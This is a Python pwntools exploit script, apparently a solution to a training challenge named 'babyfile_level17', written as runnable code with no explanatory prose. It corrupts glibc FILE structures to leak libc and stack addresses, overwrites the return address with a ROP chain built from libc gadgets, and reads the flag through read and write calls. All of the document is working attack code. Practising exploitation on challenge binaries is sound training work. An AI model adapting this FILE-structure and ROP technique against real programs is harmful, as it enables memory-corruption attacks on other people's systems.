#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder
# In this level, run this payload several time to get the flag
_libc = "./libc.so.6"
_ld = "./ld-linux-x86-64.so.2"

HOST = 'localhost'
port = 1337
_arch = 64

user = os.getenv('USER')
if user == 'broder':
    binary = "./babyfile_level17_patched"
else:
    binary = "/challenge/babyfile_level17"
    
context.log_level = 'info'
context.binary = elf = ELF(binary, checksec=False)

if user == 'broder':
    libc = ELF(_libc, checksec=False)
    _ld = ELF(_ld, checksec=False)
else:
    libc = elf.libc

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'),
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
breakrva 0x205F
breakrva 0x19AB
breakrva 0x205D
c
decompiler connect ida --host 172.19.176.1 --port 3662
si
c
c
"""

info        = lambda msg: log.info(msg)
success     = lambda msg: log.success(msg)
error       = lambda msg: log.error(msg)
sla         = lambda msg, data: io.sendlineafter(msg, data)
sa          = lambda msg, data: io.sendafter(msg, data)
sl          = lambda data: io.sendline(data)
s           = lambda data: io.send(data)
rcu         = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def stop():
    if args.GDB:
        pause()

def start():
    if args.GDB:
        if args.VSCODE:
            context.terminal = ["/home/broder/.vscode-terminal"]
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, port)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)

io = start()
io.timeout = 0.2
sla(b'> ', b'open_file')
rcu(b'fp = fopen("/tmp/babyfile.txt", "r+") = ')
fp = int(io.recvline().strip(), 16)
success(f"fp @ {hex(fp)}")
fs = FileStructure()
__GI__IO_file_jumps = fp + 0xd8
payload = fs.write(__GI__IO_file_jumps, 20) 
success(f"Address contains __GI__IO_file_jumps: {hex(__GI__IO_file_jumps)}")
sla(b'> ', b'new_note') # 0
sla(b'Which note? (0-10)\n> ', b'0')
sla(b'How many bytes to the note?\n> ', str(len(payload)).encode())
rcu(b'notes[0] = ')
note = int(rcu(b';')[:-1], 16)
success(f"note @ {hex(note)}")

sla(b'> ', b'write_fp')
s(payload)

sla(b'> ', b'write_file')
sla(b'Which note? (0-10)\n> ', b'0')
rcu(b'fwrite(notes[0], 1, 115, fp);\n')
__GI__IO_file_jumps = u64(io.recvn(6) + b'\x00\x00')
if user == 'broder':
    libc.address = __GI__IO_file_jumps - libc.sym['__GI__IO_file_jumps']
else: 
    libc.address = __GI__IO_file_jumps - 0x1e94a0
success(f"libc @ {hex(libc.address)}")

sla(b'> ', b'open_file')
rcu(b'fp = fopen("/tmp/babyfile.txt", "r+") = ')
fp = int(io.recvline().strip(), 16)
success(f"fp @ {hex(fp)}")
fs = FileStructure()
payload = fs.write(libc.sym['environ'], 20)

sla(b'> ', b'write_fp')
s(payload)

sla(b'> ', b'write_file')
sla(b'Which note? (0-10)\n> ', b'0')
rcu(b'fwrite(notes[0], 1, 115, fp);\n')
stack = u64(io.recvn(6) + b'\x00\x00')
success(f"stack @ {hex(stack)}")

ret_addr = stack - 0x130

rop = ROP(libc)
poprdi = p(rop.find_gadget(['pop rdi', 'ret'])[0])
poprsi = p(rop.find_gadget(['pop rsi', 'ret'])[0])
poprdx_rbx = p(rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0])
poprsp = p(rop.find_gadget(['pop rsp', 'ret'])[0])
ret = p(rop.find_gadget(['ret'])[0])
read = p(libc.sym['read'])
write = p(libc.sym['write'])


sla(b'> ', b'open_file')
rcu(b'fp = fopen("/tmp/babyfile.txt", "r+") = ')
fp = int(io.recvline().strip(), 16)
success(f"fp @ {hex(fp)}")
fs = FileStructure()
payload = fs.read(ret_addr, 1000)

sla(b'> ', b'write_fp')
s(payload)

sla(b'> ', b'read_file')
sla(b'Which note? (0-10)\n> ', b'0')
rcu(b'fread(notes[0], 1, 115, fp);\n')
count = 0
while True:
    s(poprdi + p(0) + poprsi + p(stack + 8 * 10) + poprdx_rbx + p(0x100) + p(0) + read + poprsp + p(stack + 8 * 10))
    count += 1
    try:
        res = io.recvline()
        if b'[*] Commands:' in res:
            info(f"Count: {count}")
            break
    except:
        pass

# for i in range(2):
#     s(poprdi + p(0) + poprsi + p(stack + 8 * 10) + poprdx_rbx + p(0x100) + p(0) + read + poprsp + p(stack + 8 * 10))

success(f"ret_addr @ {hex(ret_addr)}")
sla(b'> ', b'open_flag')
sla(b'> ', b'quit')
stop()
payload = poprdi + p(6) + poprsi + p(stack) + poprdx_rbx + p(0x100) + p(0) + read 
payload += poprdi + p(1) + poprsi + p(stack) + poprdx_rbx + p(0x100) + p(0) + write
s(payload)
io.interactive()
